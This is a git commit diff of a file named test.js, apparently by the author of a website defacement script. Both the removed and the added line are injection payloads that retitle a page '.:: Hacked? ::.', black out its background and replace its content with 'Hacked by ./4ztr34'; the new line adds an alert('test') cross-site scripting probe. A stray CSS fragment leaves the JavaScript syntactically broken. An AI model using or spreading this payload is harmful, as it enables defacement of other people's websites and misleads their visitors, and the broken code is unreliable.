b64f80b00ad54cf9455585b46b45fedbe7769a30
4ztr34 <110265177+4ztr34@users.noreply.github.com>
2022-07-30 06:26:34 +0700

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,1 @@
-document.title=".:: Hacked? ::.";document.body.style.background="#000000";url('https://media.giphy.com/media/FcqKy4Kj7XOK0hCW4g/giphy.gif') no-repeat center center";document.body.innerHTML="<body><p style='color:white;font-size:4rem;margin-top:2rem'>Hacked by ./4ztr34</p><p style='color:red;font-size:2rem;'>Repair Your System</p></body>";
-
-
+alert('test');document.title=".:: Hacked? ::.";document.body.style.background="#000000";url('https://media.giphy.com/media/FcqKy4Kj7XOK0hCW4g/giphy.gif') no-repeat center center";document.body.innerHTML="<body><p style='color:white;font-size:4rem;margin-top:2rem'>Hacked by ./4ztr34</p><p style='color:red;font-size:2rem;'>Repair Your System</p></body>";
